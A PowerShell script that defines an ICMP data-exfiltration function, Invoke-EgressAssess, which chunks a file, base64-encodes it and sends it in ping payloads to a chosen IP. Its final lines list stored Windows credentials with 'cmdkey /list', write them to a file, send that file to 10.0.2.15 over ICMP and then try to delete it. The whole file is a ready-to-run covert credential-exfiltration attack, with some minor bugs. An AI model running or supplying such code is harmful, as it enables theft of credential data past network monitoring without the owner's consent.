function Invoke-EgressAssess
{

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $False)]
        [string]$Client,
        [Parameter(Mandatory = $True)]
        [string]$IP,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [string]$Datatype
    )
    begin
    {
        #stop looping errors
        $ErrorActionPreference = "Stop"
                
        function Use-ICMP
        {
			if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
            $filetransfer = $true
			$FinalDestination = $IP
            $ByteReader = 0
            $PacketNumber = 1
            $bufferSize = 1050
            $Timeout = 1000
            
            if ($FileTransfer -eq $True)
            {
                $Delimiter = '.:::-989-:::.'
                $SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
                $FileName = get-childitem $Datatype | % { $_.Name }
                $NameBytes = [System.Text.Encoding]::UTF8.GetBytes($FileName)
                $DelimiterBytes = [System.Text.Encoding]::UTF8.GetBytes($Delimiter)
                $reader = [System.IO.File]::OpenRead($SourceFilePath)
                $TotalPackets = [int]($reader.length / 1050)
                $bytesRead = 0
                $PacketNumber = 1
                do
                {
                    $buffer = New-Object byte[] $bufferSize
                    $bytesRead = $reader.Read($buffer, 0, $bufferSize);
                    $EncodedData = [Convert]::ToBase64String($NameBytes + $DelimiterBytes + $buffer)
                    $Encoder = [system.Text.Encoding]::UTF8
                    $Buffer = $Encoder.GetBytes($EncodedData)
                    $Ping = New-Object -TypeName System.Net.NetworkInformation.Ping
                    Write-Verbose "[*] Sending packet $PacketNumber/$TotalPackets"
                    $PingReply = $Ping.Send($FinalDestination, $Timeout, $Buffer)
                    $buffer = ''
                    $PacketNumber++
                }
                while ($bytesRead -eq $bufferSize);
                $reader.Dispose()
                Write-Verbose "[*] File transfer complete!"
                break
            }
            else
            {
                Do
                {
                    try
                    {
                        Write-Verbose "[*] Sending data via ICMP."
                        [int]$TotalPackets = ($ICMPData.length/$bufferSize)
                        While ($ByteReader -le ($ICMPData.length - $bufferSize))
                        {
                            Write-Verbose "[*] Sending $PacketNumber of $TotalPackets packets"
                            $DataToSend = $ICMPData.Substring($ByteReader, $bufferSize)
                            $Encoder = [system.Text.Encoding]::UTF8
                            $DataBytes = $Encoder.GetBytes($DataToSend)
                            $EncodedData = [System.Convert]::ToBase64String($DataBytes)
                            $Buffer = $Encoder.GetBytes($EncodedData)
                            $Ping = New-Object -TypeName System.Net.NetworkInformation.Ping
                            $PingReply = $Ping.Send($FinalDestination, $Timeout, $Buffer)
                            $ByteReader += $bufferSize
                            $PacketNumber++
                        }
                    }
                    catch
                    {
                        $ErrorMessage = $_.Exception.Message
                        Write-Verbose "[*] Error, transfer failed with error:"
                        Write-Verbose $ErrorMessage
                        Break
                    }
                    Write-Verbose "[*] Transfer complete!"
                    $ByteReader = 0
                    $PacketNumber = 0
                    $loops--
                    Write-Verbose "[*] $loops loops remaining.."
                }
                While ($Loops -gt 0)
            }
        }
    }
    process
    {
		if ($client -eq "icmp")
        {
            Use-ICMP
        }
    }
    end
    {
        [System.GC]::Collect()
        Write-Verbose "[*] Exiting.."
    }
}

# Clear the $Error variable to ensure we're capturing new errors
$Error.Clear()

# Run the command and capture the output
$commandOutput = cmdkey /list

# Capture any errors that occurred
$errorOutput = $Error | Out-String
$Error.Clear()  # Clear the $Error variable again to avoid capturing previous errors

# Combine the command output and error output
$output = $commandOutput + "`n`n" + $errorOutput

echo $output > commandsoutput.txt

Invoke-EgressAssess -client icmp -ip 10.0.2.15 -Datatype ' commandsoutput.txt' -Verbose

rm .\commandsoutput
